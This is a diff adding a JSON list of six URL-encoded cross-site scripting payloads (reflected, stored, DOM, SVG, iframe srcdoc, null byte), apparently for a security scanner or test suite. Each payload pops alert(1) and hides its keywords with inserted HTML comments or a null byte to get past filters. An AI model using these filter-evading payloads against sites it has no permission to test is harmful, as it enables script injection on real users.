@@ -1,0 +1,26 @@
+[
+    {
+        "type": "Reflected",
+        "payload": "%3Cscr%3C%21--%20--%3Eipt%3Eal%3C%21--%20--%3Eert%281%29%3C/scr%3C%21--%20--%3Eipt%3E"
+    },
+    {
+        "type": "Stored",
+        "payload": "%3Cimg%20src%3Dx%20on%3C%21--%20--%3Eerror%3Dal%3C%21--%20--%3Eert%281%29%3E"
+    },
+    {
+        "type": "DOM-Based",
+        "payload": "javascr%3C%21--%20--%3Eipt%3Aal%3C%21--%20--%3Eert%281%29"
+    },
+    {
+        "type": "SVG Bypass",
+        "payload": "%3Csvg/onload%3Dal%3C%21--%20--%3Eert%281%29%3E"
+    },
+    {
+        "type": "Srcdoc",
+        "payload": "%3Ciframe%20srcdoc%3D%22%3Cscr%3C%21--%20--%3Eipt%3Eal%3C%21--%20--%3Eert%281%29%3C/scr%3C%21--%20--%3Eipt%3E%22%3E%3C/iframe%3E"
+    },
+    {
+        "type": "Null Byte",
+        "payload": "%3Cscr%3C%21--%20--%3Eipt%2500%3Eal%3C%21--%20--%3Eert%281%29%3C/scr%3C%21--%20--%3Eipt%3E"
+    }
+]
